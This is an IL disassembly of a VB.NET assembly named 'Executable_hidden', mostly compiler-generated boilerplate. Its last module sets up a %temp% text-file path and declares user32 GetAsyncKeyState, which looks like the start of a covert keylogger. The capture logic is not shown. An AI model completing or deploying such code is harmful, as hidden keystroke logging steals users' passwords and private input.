
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.8.3928.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v4.0.30319
.module extern user32
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 10:0:0:0
}
.assembly Executable_hidden
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 02 00 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 63 30 61 33 39 61 65 64 2D 39 63 34 35   // ..$c0a39aed-9c45
                                                                                                  2D 34 36 64 39 2D 39 33 32 36 2D 62 61 30 37 61   // -46d9-9326-ba07a
                                                                                                  65 38 65 31 64 38 33 00 00 )                      // e8e1d83..
  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 30 2E 30 2E 30 2E 30 00 00 )             // ...0.0.0.0..
  .custom instance void [mscorlib]System.Runtime.Versioning.TargetFrameworkAttribute::.ctor(string) = ( 01 00 1C 2E 4E 45 54 46 72 61 6D 65 77 6F 72 6B   // ....NETFramework
                                                                                                        2C 56 65 72 73 69 6F 6E 3D 76 34 2E 37 2E 32 01   // ,Version=v4.7.2.
                                                                                                        00 54 0E 14 46 72 61 6D 65 77 6F 72 6B 44 69 73   // .T..FrameworkDis
                                                                                                        70 6C 61 79 4E 61 6D 65 14 2E 4E 45 54 20 46 72   // playName..NET Fr
                                                                                                        61 6D 65 77 6F 72 6B 20 34 2E 37 2E 32 )          // amework 4.7.2
  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.mresource public Executable_hidden.Resources.resources
{
  // Offset: 0x00000000 Length: 0x000000B4
  // WARNING: managed resource file Executable_hidden.Resources.resources created
}
.module Executable_hidden.exe
// MVID: {DB908B38-3C84-4F55-8BB4-5EFBBEE7A171}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00020003    //  ILONLY 32BITPREFERRED
// Image base: 0x067E0000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi Executable_hidden.My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ConsoleApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ConsoleApplicationBase::.ctor()
    IL_0006:  ret
  } // end of method MyApplication::.ctor

} // end of class Executable_hidden.My.MyApplication

.class private auto ansi Executable_hidden.My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0006:  ret
  } // end of method MyComputer::.ctor

} // end of class Executable_hidden.My.MyComputer

.class private auto ansi sealed beforefieldinit Executable_hidden.My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public hidebysig strict virtual 
            instance bool  Equals(object o) cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       13 (0xd)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0007:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000c:  ret
    } // end of method MyWebServices::Equals

    .method public hidebysig strict virtual 
            instance int32  GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0006:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       11 (0xb)
      .maxstack  8
      IL_0000:  ldtoken    Executable_hidden.My.MyProject/MyWebServices
      IL_0005:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000a:  ret
    } // end of method MyWebServices::GetType

    .method public hidebysig strict virtual 
            instance string  ToString() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance string [mscorlib]System.Object::ToString()
      IL_0006:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       20 (0x14)
      .maxstack  1
      .locals init (!!T V_0)
      IL_0000:  ldarg.0
      IL_0001:  box        !!T
      IL_0006:  brtrue.s   IL_0010

      IL_0008:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0012

      IL_0010:  ldarg.0
      IL_0011:  stloc.0
      IL_0012:  ldloc.0
      IL_0013:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       8 (0x8)
      .maxstack  8
      IL_0000:  ldarg.1
      IL_0001:  initobj    !!T
      IL_0007:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       28 (0x1c)
      .maxstack  8
      IL_0000:  ldsfld     !0 class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0005:  box        !T
      IL_000a:  brtrue.s   IL_0016

      IL_000c:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0011:  stsfld     !0 class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0016:  ldsfld     !0 class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001b:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyApplication> m_AppObjectProvider
  .field private static initonly class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  8
    IL_0000:  newobj     instance void class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyComputer>::.ctor()
    IL_0005:  stsfld     class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyComputer> Executable_hidden.My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyApplication>::.ctor()
    IL_000f:  stsfld     class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyApplication> Executable_hidden.My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> Executable_hidden.My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyProject/MyWebServices> Executable_hidden.My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class Executable_hidden.My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyComputer> Executable_hidden.My.MyProject::m_ComputerObjectProvider
    IL_0005:  callvirt   instance !0 class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyComputer>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class Executable_hidden.My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyApplication> Executable_hidden.My.MyProject::m_AppObjectProvider
    IL_0005:  callvirt   instance !0 class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyApplication>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> Executable_hidden.My.MyProject::m_UserObjectProvider
    IL_0005:  callvirt   instance !0 class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class Executable_hidden.My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyProject/MyWebServices> Executable_hidden.My.MyProject::m_MyWebServicesObjectProvider
    IL_0005:  callvirt   instance !0 class Executable_hidden.My.MyProject/ThreadSafeObjectProvider`1<class Executable_hidden.My.MyProject/MyWebServices>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_WebServices

  .property class Executable_hidden.My.MyComputer
          Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class Executable_hidden.My.MyComputer Executable_hidden.My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class Executable_hidden.My.MyApplication
          Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class Executable_hidden.My.MyApplication Executable_hidden.My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User Executable_hidden.My.MyProject::get_User()
  } // end of property MyProject::User
  .property class Executable_hidden.My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class Executable_hidden.My.MyProject/MyWebServices Executable_hidden.My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class Executable_hidden.My.MyProject

.class private auto ansi sealed Executable_hidden.My.Resources.Resources
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 33 53 79 73 74 65 6D 2E 52 65 73 6F 75 72   // ..3System.Resour
                                                                                                  63 65 73 2E 54 6F 6F 6C 73 2E 53 74 72 6F 6E 67   // ces.Tools.Strong
                                                                                                  6C 79 54 79 70 65 64 52 65 73 6F 75 72 63 65 42   // lyTypedResourceB
                                                                                                  75 69 6C 64 65 72 08 31 36 2E 30 2E 30 2E 30 00   // uilder.16.0.0.0.
                                                                                                  00 ) 
  .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private static class [mscorlib]System.Resources.ResourceManager resourceMan
  .field private static class [mscorlib]System.Globalization.CultureInfo resourceCulture
  .method assembly specialname static class [mscorlib]System.Resources.ResourceManager 
          get_ResourceManager() cil managed
  {
    // Code size       49 (0x31)
    .maxstack  8
    IL_0000:  ldsfld     class [mscorlib]System.Resources.ResourceManager Executable_hidden.My.Resources.Resources::resourceMan
    IL_0005:  ldnull
    IL_0006:  call       bool [mscorlib]System.Object::ReferenceEquals(object,
                                                                       object)
    IL_000b:  brfalse.s  IL_002b

    IL_000d:  ldstr      "Executable_hidden.Resources"
    IL_0012:  ldtoken    Executable_hidden.My.Resources.Resources
    IL_0017:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_001c:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Type::get_Assembly()
    IL_0021:  newobj     instance void [mscorlib]System.Resources.ResourceManager::.ctor(string,
                                                                                         class [mscorlib]System.Reflection.Assembly)
    IL_0026:  stsfld     class [mscorlib]System.Resources.ResourceManager Executable_hidden.My.Resources.Resources::resourceMan
    IL_002b:  ldsfld     class [mscorlib]System.Resources.ResourceManager Executable_hidden.My.Resources.Resources::resourceMan
    IL_0030:  ret
  } // end of method Resources::get_ResourceManager

  .method assembly specialname static class [mscorlib]System.Globalization.CultureInfo 
          get_Culture() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldsfld     class [mscorlib]System.Globalization.CultureInfo Executable_hidden.My.Resources.Resources::resourceCulture
    IL_0005:  ret
  } // end of method Resources::get_Culture

  .method assembly specialname static void 
          set_Culture(class [mscorlib]System.Globalization.CultureInfo Value) cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  stsfld     class [mscorlib]System.Globalization.CultureInfo Executable_hidden.My.Resources.Resources::resourceCulture
    IL_0006:  ret
  } // end of method Resources::set_Culture

  .property class [mscorlib]System.Resources.ResourceManager
          ResourceManager()
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
    .get class [mscorlib]System.Resources.ResourceManager Executable_hidden.My.Resources.Resources::get_ResourceManager()
  } // end of property Resources::ResourceManager
  .property class [mscorlib]System.Globalization.CultureInfo
          Culture()
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
    .get class [mscorlib]System.Globalization.CultureInfo Executable_hidden.My.Resources.Resources::get_Culture()
    .set void Executable_hidden.My.Resources.Resources::set_Culture(class [mscorlib]System.Globalization.CultureInfo)
  } // end of property Resources::Culture
} // end of class Executable_hidden.My.Resources.Resources

.class private auto ansi sealed beforefieldinit Executable_hidden.My.MySettings
       extends [System]System.Configuration.ApplicationSettingsBase
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 4B 4D 69 63 72 6F 73 6F 66 74 2E 56 69 73   // ..KMicrosoft.Vis
                                                                                                  75 61 6C 53 74 75 64 69 6F 2E 45 64 69 74 6F 72   // ualStudio.Editor
                                                                                                  73 2E 53 65 74 74 69 6E 67 73 44 65 73 69 67 6E   // s.SettingsDesign
                                                                                                  65 72 2E 53 65 74 74 69 6E 67 73 53 69 6E 67 6C   // er.SettingsSingl
                                                                                                  65 46 69 6C 65 47 65 6E 65 72 61 74 6F 72 08 31   // eFileGenerator.1
                                                                                                  36 2E 33 2E 30 2E 30 00 00 )                      // 6.3.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
  .field private static class Executable_hidden.My.MySettings defaultInstance
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       21 (0x15)
    .maxstack  8
    IL_0000:  newobj     instance void Executable_hidden.My.MySettings::.ctor()
    IL_0005:  call       class [System]System.Configuration.SettingsBase [System]System.Configuration.SettingsBase::Synchronized(class [System]System.Configuration.SettingsBase)
    IL_000a:  castclass  Executable_hidden.My.MySettings
    IL_000f:  stsfld     class Executable_hidden.My.MySettings Executable_hidden.My.MySettings::defaultInstance
    IL_0014:  ret
  } // end of method MySettings::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System]System.Configuration.ApplicationSettingsBase::.ctor()
    IL_0006:  ret
  } // end of method MySettings::.ctor

  .method public specialname static class Executable_hidden.My.MySettings 
          get_Default() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldsfld     class Executable_hidden.My.MySettings Executable_hidden.My.MySettings::defaultInstance
    IL_0005:  ret
  } // end of method MySettings::get_Default

  .property class Executable_hidden.My.MySettings
          Default()
  {
    .get class Executable_hidden.My.MySettings Executable_hidden.My.MySettings::get_Default()
  } // end of property MySettings::Default
} // end of class Executable_hidden.My.MySettings

.class private auto ansi sealed Executable_hidden.My.MySettingsProperty
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method assembly specialname static class Executable_hidden.My.MySettings 
          get_Settings() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       class Executable_hidden.My.MySettings Executable_hidden.My.MySettings::get_Default()
    IL_0005:  ret
  } // end of method MySettingsProperty::get_Settings

  .property class Executable_hidden.My.MySettings
          Settings()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 53 65 74 74 69 6E 67 73 00 00 ) // ...My.Settings..
    .get class Executable_hidden.My.MySettings Executable_hidden.My.MySettingsProperty::get_Settings()
  } // end of property MySettingsProperty::Settings
} // end of class Executable_hidden.My.MySettingsProperty

.class public auto ansi sealed beforefieldinit Executable_hidden.Module1
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .field public static object l
  .field public static object q
  .field public static object t
  .field public static object p
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldnull
    IL_0001:  stsfld     object Executable_hidden.Module1::l
    IL_0006:  ldc.i4.0
    IL_0007:  box        [mscorlib]System.Int32
    IL_000c:  stsfld     object Executable_hidden.Module1::q
    IL_0011:  ldstr      ".txt"
    IL_0016:  stsfld     object Executable_hidden.Module1::t
    IL_001b:  ldstr      "temp"
    IL_0020:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0025:  ldstr      "\\"
    IL_002a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_002f:  stsfld     object Executable_hidden.Module1::p
    IL_0034:  ret
  } // end of method Module1::.cctor

  .method public static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 vKey) cil managed preservesig
  {
  }
